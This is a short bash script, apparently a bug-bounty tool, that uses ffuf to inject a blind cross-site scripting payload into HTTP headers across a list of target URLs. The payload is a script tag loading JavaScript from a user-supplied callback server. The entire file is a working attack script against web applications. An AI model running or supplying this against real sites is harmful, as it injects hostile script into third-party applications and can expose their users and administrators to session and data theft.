#!/bin/bash
#Coded by @lemosnlmb

RED='\033[1;31m'
NC='\033[0m'

list=$1
blindxss=$2

echo -e "${RED}CHECK YOUR XSS HUNTER/BLIND XSS SERVER FOR POTENTIALS CALLBACKS!${NC}"
ffuf -r -w $list:W1,headers.txt:W2 -H "W2: \"><script src=https://$blindxss></script>" -u W1 2 > /dev/null
